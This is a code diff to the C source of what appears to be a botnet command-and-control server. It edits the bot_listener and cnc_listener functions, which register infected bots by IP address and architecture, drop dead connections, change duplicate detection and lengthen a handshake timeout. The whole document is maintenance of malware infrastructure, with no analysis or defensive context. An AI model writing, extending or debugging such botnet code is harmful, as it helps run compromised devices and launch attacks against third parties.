@@ -173,22 +173,22 @@ void* bot_listener(void* arg) {
             sleep(1);
             continue;
         }
-        perror("Failed to bind bot port");
+        perror("Failed to bind bot server socket");
         close(bot_server_socket);
         return NULL;
     }
 
     if (listen(bot_server_socket, MAX_BOTS) < 0) {
-        perror("Failed to listen on bot port");
+        perror("Failed to listen on bot server socket");
         close(bot_server_socket);
         return NULL;
     }
 
     while (1) {
+        bool found_duplicate = false;
         struct sockaddr_in client_addr;
         socklen_t client_len = sizeof(client_addr);
         int *bot_socket = malloc(sizeof(int));
-        bool found_duplicate = false;
         if (!bot_socket) continue;
         
         *bot_socket = accept(bot_server_socket, (struct sockaddr*)&client_addr, &client_len);
@@ -228,22 +228,32 @@ void* bot_listener(void* arg) {
                 archbuf[archlen] = 0;
                 pthread_mutex_lock(&bot_mutex);
                 
+                int new_count = 0;
                 for (int i = 0; i < bot_count; i++) {
-                    if (bots[i].is_valid && bots[i].address.sin_addr.s_addr == client_addr.sin_addr.s_addr) {
+                    if (bots[i].is_valid) {
                         char test = 0;
                         if (send(bots[i].socket, &test, 0, MSG_NOSIGNAL) < 0) {
                             close(bots[i].socket);
                             bots[i].is_valid = 0;
-                        } else {
-                            found_duplicate = true;
-                            close(*bot_socket);
-                            free(bot_socket);
-                            pthread_mutex_unlock(&bot_mutex);
-                            break;
+                            continue;
                         }
+                        if (i != new_count) {
+                            bots[new_count] = bots[i];
+                        }
+                        new_count++;
                     }
                 }
-                
+                bot_count = new_count;
+
+                for (int i = 0; i < bot_count; i++) {
+                    if (bots[i].is_valid && 
+                        bots[i].address.sin_addr.s_addr == client_addr.sin_addr.s_addr &&
+                        strcmp(bots[i].arch, archbuf) == 0) {
+                        found_duplicate = true;
+                        break;
+                    }
+                }
+
                 if (!found_duplicate && bot_count < MAX_BOTS) {
                     int new_count = 0;
                     for (int i = 0; i < bot_count; i++) {
@@ -267,7 +277,7 @@ void* bot_listener(void* arg) {
                     
                     FD_ZERO(&readfds);
                     FD_SET(*bot_socket, &readfds);
-                    tv.tv_sec = 5;
+                    tv.tv_sec = 10;
                     tv.tv_usec = 0;
                     
                     if (select(*bot_socket + 1, &readfds, NULL, NULL, &tv) > 0) {
@@ -289,6 +299,7 @@ void* bot_listener(void* arg) {
                             pthread_create(&bot_thread, NULL, handle_bot, bot_socket);
                             pthread_detach(bot_thread);
                             pthread_mutex_unlock(&bot_mutex);
+                            found_duplicate = true;
                             continue;
                         }
                     }
@@ -302,6 +313,7 @@ void* bot_listener(void* arg) {
             free(bot_socket);
         }
     }
+    
     close(bot_server_socket);
     return NULL;
 }
@@ -404,6 +416,7 @@ void* cnc_listener(void* arg) {
     }
 
     int optval = 1;
+    // the most needed options, all OSes must have... (check anyway)
     if (setsockopt(server_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval)) < 0 ||
         setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
         perror("Failed to set CNC socket options");
